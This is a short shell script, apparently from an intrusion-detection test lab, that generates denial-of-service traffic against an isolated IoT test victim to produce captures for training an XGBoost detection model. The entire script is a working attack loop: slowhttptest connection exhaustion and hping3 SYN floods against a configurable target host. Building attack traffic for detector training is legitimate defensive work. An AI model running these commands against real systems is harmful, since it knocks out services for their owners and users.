#!/bin/sh
# NEXA test-attack: DoS — single-source denial-of-service signature against the
# isolated IoT test victim, for the new TON-IoT XGBoost model (iot_test lane).
echo "[DOS] Starting..."
TARGET="${TARGET_HOST:-172.20.0.50}"
INTENSITY="${INTENSITY:-medium}"
DURATION="${DURATION:-60}"
END=$(($(date +%s) + DURATION))

# Intensity -> concurrent slow connections / SYN-flood packets / pause.
# Kept modest so each capture yields a few hundred flows (fast CICFlowMeter).
case "$INTENSITY" in
    low)    CONN=40;  FLOOD=100;  SLEEP_MAX=6 ;;
    high)   CONN=150; FLOOD=400;  SLEEP_MAX=2 ;;
    *)      CONN=80;  FLOOD=200;  SLEEP_MAX=4 ;;  # medium
esac

while [ "$(date +%s)" -lt "$END" ]; do
    # Resource-exhaustion against the device web interface
    slowhttptest -c "$CONN" -H \
        -o /tmp/dos_output \
        -i 10 -r 200 -t GET \
        -u "http://$TARGET/" \
        -x 24 -p 3 -l 30 2>/dev/null
    # Short SYN-flood burst to amplify the DoS signature
    hping3 -S -p 80 -i u1000 -c "$FLOOD" "$TARGET" 2>/dev/null
    sleep $((RANDOM % SLEEP_MAX + 1))
done
echo "[DOS] Done."
